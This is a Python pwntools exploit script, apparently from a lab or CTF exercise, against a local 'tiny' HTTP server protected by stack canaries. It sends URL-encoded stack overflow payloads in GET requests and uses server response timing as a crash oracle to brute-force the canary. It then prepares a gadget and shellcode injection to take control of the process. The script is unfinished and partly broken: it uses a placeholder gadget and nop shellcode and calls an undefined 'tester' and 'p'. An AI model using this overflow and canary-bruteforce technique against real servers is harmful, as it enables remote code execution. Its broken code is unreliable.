from IPython import embed
from pwn import *
import time
import statistics
import math
from scipy.stats import norm

context.terminal = ['tmux', 'splitw', '-h']

ADDR = "127.0.0.1"
PORT = 9999
local_file = './tiny.canary' # only canary protection

e = ELF(local_file)
context.binary = e
context.log_level = "info"
# libc = e.libc
# libc.address = libc_base


def package_http_request(path):
    """Craft the bytes for a valid HTTP/1.1 GET request containing our payload """
    return b"".join([
        b"GET ", path, b" HTTP/1.1\r\n",
        f"Host: {ADDR}:{PORT}\r\n".encode(),
        b"User-Agent: Hacker\r\n",
        b"\r\n"
        ])

def run_expl(payload, log=True):
    p = remote(ADDR, PORT)
    # buffer overflow
    padding_size = 0x220       # tiny with canary
    expl = b''
    expl += b'a'*(padding_size-8) #8 is the canary size
    expl += payload
    #url encode all the bytes that would block the http parser
    expl = expl.replace(b'%', b'%25')
    expl = expl.replace(b'\x00', b'%00')
    expl = expl.replace(b'\x20', b'%20')
    expl = expl.replace(b'\x0a', b'%0a')
    expl = expl.replace(b'\x0d', b'%0d')
    http_req = package_http_request(expl)
    if log:
        print("sending these request bytes:")
        print(http_req)
    p.send(http_req)
    return p


def c(comment):
    """this is just a dummy function to insert comments in the asm string"""
    return ""


def run_expl_timer(expl):
    p = run_expl(expl, log=False)
    out = p.recvuntil(b'File not found')
    #measure the time the server takes
    #to close the socket as an oracle
    start = time.perf_counter()
    end = 0
    try:
        while True:
            out = p.recv_raw(100);
            print(out)
    except:
        end = time.perf_counter()
    p.close()
    delta = end-start
    print(f"server response time: {delta}")
    return delta

def generate_crash_time_test(n=30, alpha=0.5):
    """returns a function that will test if a given server response time
    indicates a server crash

    Run this to regenerate the test function every time 
    you suspect that the network conditions changed,
    and a new sample is required for an accurate test
    """
    # get sample, from running a query that doesn't crash the server
    print("generating sample...")
    sample_timings = []
    for _ in range(n):
        expl = b'' #no exploit, the server should not crash
        sample_timings.append(run_expl_timer(expl))
    # calculate sample statistics
    mean = statistics.mean(sample_timings)
    std = statistics.stdev(sample_timings)
    n = len(sample_timings)
    stderr = std / math.sqrt(n)
    print(f"mean: {mean}\nstd: {std}\n n:{n}")

    def z_test(x):
        """return true if the given x time measurement indicates a server crash

        This is testing if x is different from the sample measurements.
        The sample measurements are taken on a non-crashing payload.
        """
        z_score = (x - mean) / stderr
        # The p-value for a two-tailed test (check for significance in both directions)
        p_value = 2 * norm.sf(abs(z_score))
        #null hyp: x has the same distrib. as the sample.
        #alt hyp: x is different from the sample
        reject_null_hyp = p_value < alpha
        return reject_null_hyp

    def is_outlier(x):
        """return true if the given x time measurement indicates a server crash

        This is testing if x is an outlier in the sample measurements.
        The sample measurements are taken on a non-crashing payload.
        """
        treshold = 3
        Z = (x - mean) / std
        print(f"treshold: {Z}")
        is_outlier = abs(Z) > treshold
        return is_outlier

    return is_outlier

    




def run_shellcode(canary):

    shellcode_payload = f"""
    nop
    """

    shellcode_bytes = asm(shellcode_payload)
    print("shellcode bytes:")
    print(shellcode_bytes)
    expl = b''
    expl += canary
    expl += b'xxxxxxxx' #gadget: call rsp;
    expl += shellcode_bytes
    run_expl(expl)
    #TODO: put success mark detection code here
    p.interactive()


# run_expl()

def main():
    context.log_level = "warn"
    is_crash_time = generate_crash_time_test()

    #bruteforce the canary
    
    for _ in range(10):
        t1 = run_expl_timer(b'\x00')
        test = tester(t1)
        print(f"NOCRASH time: {t1} is_crash: {test}")
        if test:
            print("!!!!!!!!!!!!")
        t1 = run_expl_timer(b'\x01')
        test = tester(t1)
        print(f"CRASH time: {t1} is_crash: {test}")
        if not test:
            print("!!!!!!!!!!!!")


    context.log_level = "info"


main()

